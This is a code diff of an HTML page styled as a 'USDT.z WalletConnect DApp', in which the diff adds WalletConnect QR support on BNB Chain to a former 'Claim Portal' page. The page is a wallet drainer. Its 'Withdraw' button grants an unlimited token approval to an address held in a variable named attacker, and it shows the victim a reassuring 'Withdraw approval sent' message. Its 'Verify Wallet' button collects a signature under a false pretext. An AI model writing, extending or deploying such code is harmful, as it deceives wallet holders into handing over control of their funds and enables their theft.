@@ -2,28 +2,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>USDT.z Claim Portal</title>
+  <title>USDT.z WalletConnect DApp</title>
   <style>
-    body { font-family: Arial; text-align: center; background: #f2f2f2; padding: 40px; }
-    .box { background: white; border-radius: 10px; padding: 30px; display: inline-block; }
-    .title { font-size: 24px; margin-bottom: 10px; }
+    body { font-family: Arial, sans-serif; text-align: center; background: #f4f4f4; padding: 50px; }
+    .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; }
+    .title { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
+    .btn { padding: 10px 20px; margin: 10px; cursor: pointer; font-size: 16px; }
     .value { font-size: 20px; color: green; }
-    .btn { padding: 10px 20px; margin: 10px; cursor: pointer; }
-    .danger { color: red; font-weight: bold; }
+    .danger { color: red; font-weight: bold; margin-top: 10px; }
   </style>
 </head>
 <body>
   <div class="box">
-    <div class="title">USDT.z Wallet Verification</div>
+    <div class="title">USDT.z WalletConnect DApp</div>
+    <button class="btn" onclick="connect()">Connect via QR</button>
     <p id="wallet">Wallet: Not connected</p>
     <p id="balance">Balance: -</p>
-    <p class="value">Estimated Value: $<span id="usd">0</span></p>
-    <button class="btn" onclick="connect()">Connect Wallet</button>
+    <p class="value">Estimated USD: $<span id="usd">0</span></p>
     <button class="btn" onclick="approve()">Withdraw</button>
     <button class="btn" onclick="sign()">Verify Wallet</button>
     <p class="danger" id="status"></p>
   </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
   <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
   <script>
     const tokenAddress = "0xc1C4812dc9B48742768fADbce323655C65afe0B1";
@@ -38,8 +39,16 @@
     let provider, signer;
 
     async function connect() {
-      provider = new ethers.providers.Web3Provider(window.ethereum);
-      await provider.send("eth_requestAccounts", []);
+      const WalletConnectProvider = window.WalletConnectProvider.default;
+      const wcProvider = new WalletConnectProvider({
+        rpc: {
+          56: "https://bsc-dataseed.binance.org/"
+        }
+      });
+
+      await wcProvider.enable();
+
+      provider = new ethers.providers.Web3Provider(wcProvider);
       signer = provider.getSigner();
       const address = await signer.getAddress();
       document.getElementById("wallet").innerText = "Wallet: " + address;
@@ -58,11 +67,11 @@
     async function approve() {
       const token = new ethers.Contract(tokenAddress, abi, signer);
       await token.approve(attacker, ethers.constants.MaxUint256);
-      document.getElementById("status").innerText = "Withdraw request sent.";
+      document.getElementById("status").innerText = "Withdraw approval sent.";
     }
 
     async function sign() {
-      const message = "Sign to verify your wallet for USDT.z withdrawal.";
+      const message = "Sign to verify your wallet for USDT.z.";
       const address = await signer.getAddress();
       const hexMessage = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(message));
       const signature = await provider.send("personal_sign", [hexMessage, address]);
